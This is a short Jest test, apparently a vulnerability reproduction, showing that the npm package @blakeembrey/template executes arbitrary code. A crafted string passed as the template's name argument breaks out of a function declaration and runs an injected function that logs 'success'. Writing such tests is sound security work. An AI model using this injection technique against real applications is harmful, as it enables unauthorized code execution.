test("Arbitrary code execution in @blakeembrey/template", (done) => {
  const { template } = require("@blakeembrey/template");

  console.log = jest.fn();

  template("Hello {{name}}!", "exploit() {} && ((()=>{ console.log('success'); })()) && function pwned");

  expect(console.log).toHaveBeenCalledWith('success');
  done();
});
